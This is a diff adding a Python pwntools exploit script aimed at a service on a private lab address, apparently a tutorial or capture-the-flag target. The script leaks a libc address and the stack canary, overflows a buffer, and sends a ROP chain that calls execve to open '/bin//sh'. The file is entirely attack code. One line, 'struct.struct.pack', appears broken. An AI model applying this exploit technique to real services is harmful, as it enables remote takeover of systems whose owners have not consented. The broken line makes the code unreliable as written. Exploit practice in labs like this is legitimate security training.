@@ -1,0 +1,79 @@
+from pwn import *
+import struct
+def main():
+	HOST = "192.168.56.101"
+	PORT = 55588
+	r = remote(HOST,PORT)
+	payload = "A"*300
+	for x in xrange(0,4):
+		print r.recvline()
+	r.sendline("1")
+	reference =  r.recvline()
+	libcadr = int(reference.split(":")[1].strip('\n'),0)-456800
+	print hex(libcadr)
+	r.sendline("2")
+	print r.recvline()	
+	for x in xrange(0,4):
+		print r.recvline()
+	r.sendline(payload)
+	#Spacing
+	r.recvline()
+	#Memory dump?
+	memdump = r.recvline()
+	memdump = memdump.rstrip("-Tutorial-\n")
+	cookie =  struct.unpack("<Q",memdump[len(memdump)-12:len(memdump)-4])
+	print hex(cookie[0])	
+	for x in xrange(0,3):
+		print r.recvline()
+	cookie = struct.struct.pack("<Q",cookie[0])
+	p = ''
+	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
+	p += struct.pack('<Q', libcadr+0x00000000003be080) # @ .data
+	p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax ; ret
+	p += '/bin//sh'
+	p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
+	p += struct.pack('<Q', 0x4141414141414141) # padding
+	p += struct.pack('<Q', 0x4141414141414141) # padding
+	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
+	p += struct.pack('<Q', libcadr+0x00000000003be088) # @ .data + 8
+	p += struct.pack('<Q', libcadr+0x0000000000088b75) # xor rax, rax ; ret
+	p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
+	p += struct.pack('<Q', 0x4141414141414141) # padding
+	p += struct.pack('<Q', 0x4141414141414141) # padding
+	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
+	p += struct.pack('<Q', libcadr+0x00000000003be080) # @ .data
+	p += struct.pack('<Q', libcadr+0x0000000000024885) # pop rsi ; ret
+	p += struct.pack('<Q', libcadr+0x00000000003be088) # @ .data + 8
+	p += struct.pack('<Q', libcadr+0x0000000000001b8e) # pop rdx ; ret
+	p += struct.pack('<Q', libcadr+0x00000000003be088) # @ .data + 8
+	p += struct.pack('<Q', libcadr+0x0000000000088b75) # xor rax, rax ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2ec0) # add rax, 3 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2eb0) # add rax, 1 ; ret
+	p += struct.pack('<Q', libcadr+0x00000000000a2eb0) # add rax, 1 ; ret
+	p += struct.pack('<Q', libcadr+0x000000000000269f) # syscall	
+	payload = "A"*300+"B"*4+"C"*4+"D"*4+cookie+"E"*4+"F"*4+p
+	r.sendline("2")
+	for x in xrange(0,1):
+		print r.recvline()
+	r.sendline(payload)
+	
+	pass
+main()
